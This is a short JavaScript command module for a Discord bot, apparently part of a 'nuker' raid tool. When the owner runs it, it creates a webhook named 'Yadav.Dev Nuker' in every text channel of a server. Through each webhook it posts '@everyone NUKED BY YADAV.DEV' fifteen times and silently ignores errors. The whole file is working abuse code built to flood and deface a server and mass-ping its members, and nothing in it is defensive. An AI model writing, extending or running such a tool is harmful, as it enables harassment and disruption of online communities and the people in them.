module.exports = {
  name: 'webhookspam',
  description: 'Create webhooks and spam in all channels',
  ownerOnly: true,
  async execute(message, args, client) {
    const guild = message.guild;
    if (!guild) return message.reply("❌ Not in a server.");

    message.reply("🚀 Starting webhook spam...");

    guild.channels.cache.filter(ch => ch.type === 0).forEach(async channel => {
      try {
        const webhook = await channel.createWebhook({ name: "Yadav.Dev Nuker" });
        for (let i = 0; i < 15; i++) {
          webhook.send("@everyone NUKED BY YADAV.DEV 🔥").catch(() => {});
        }
      } catch (e) {}
    });

    message.reply("✅ Webhook spam started in all text channels.");
  }
};
